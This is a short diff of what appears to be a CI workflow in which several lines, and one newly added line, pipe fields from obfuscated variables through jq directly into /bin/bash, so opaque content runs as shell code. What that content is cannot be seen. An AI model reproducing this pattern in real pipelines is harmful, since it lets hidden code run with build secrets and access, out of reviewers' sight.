@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$dl180" | jq -r .cbyy4 | /bin/bash
           printf '%s' "$cb9404" | jq -r .qngr51 | /bin/bash
           printf '%s' "$ypzr84355" | jq -r .hi3 | /bin/bash
+          echo $ue510 | jq -r .lf5 | /bin/bash
 
       - name: Save output
         if: always()
